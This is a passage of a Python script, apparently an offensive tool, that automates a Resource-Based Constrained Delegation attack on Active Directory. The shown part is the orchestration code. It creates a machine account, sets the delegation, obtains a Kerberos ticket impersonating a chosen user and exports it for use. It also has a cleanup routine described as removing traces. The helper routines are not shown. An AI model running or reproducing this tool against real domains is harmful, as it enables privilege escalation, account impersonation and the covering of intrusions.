        print(f"  {Fore.CYAN}DC IP              :{Style.RESET_ALL} {self.dc_ip}")
        print(f"  {Fore.CYAN}Impersonate User   :{Style.RESET_ALL} {self.impersonate}")
        print(f"  {Fore.CYAN}RBCD Status        :{Style.RESET_ALL} {Fore.GREEN}Configured{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}{'─'*70}{Style.RESET_ALL}\n")

    def cleanup(self):
        """Manual cleanup - call this only when you want to remove traces."""
        self.log.info("Cleaning up …")
        if not self.ad_ops:
            self.log.warning("AD operations not available for cleanup")
            return
        if self.computer_name and self.target:
            self.ad_ops.remove_rbcd_delegation(self.computer_name, f"{self.target}$")
            self.ad_ops.delete_computer_account(self.computer_name)
        for f in filter(None, [
            Path(self.tgt_ccache)  if self.tgt_ccache  else None,
            Path(self.ticket_file) if self.ticket_file else None,
            Path(f"{self.computer_sam.upper()}.ccache") if self.computer_sam else None,
            Path(f"{self.impersonate}.ccache"),
        ]):
            if f.exists():
                try: f.unlink()
                except: pass
        os.environ.pop("KRB5CCNAME", None)
        self.log.success("Cleanup complete.")

    def run(self) -> bool:
        try:
            self.interactive_setup()
            if not self.check_dependencies():
                return False
            self.recon_ad()
            steps = [
                ("Creating machine account", self.create_computer),
                ("Configuring RBCD",         self.set_rbcd),
                ("Getting Kerberos ticket",  self.get_ticket),
                ("Verifying setup",          self.verify_ticket),
            ]
            for desc, fn in steps:
                self.log.info(f"▶ {desc} …")
                if not fn():
                    self.log.error(f"Step failed: {desc}")
                    return False
                if desc != "Verifying setup":
                    time.sleep(2)
            self.log.success("=" * 60)
            self.log.success("RBCD Attack completed successfully!")
            self.log.success(f"Ticket saved to: {self.ticket_file}")
            self.log.success(f"Export with: export KRB5CCNAME={self.ticket_file}")
            self.log.success("=" * 60)
            return True
        except Exception as exc:
            self.log.error(f"Unexpected error: {exc}", exc_info=True)
            return False


if __name__ == "__main__":
    log = _build_logger()
    sys.exit(0 if RBCDAttack(log).run() else 1)
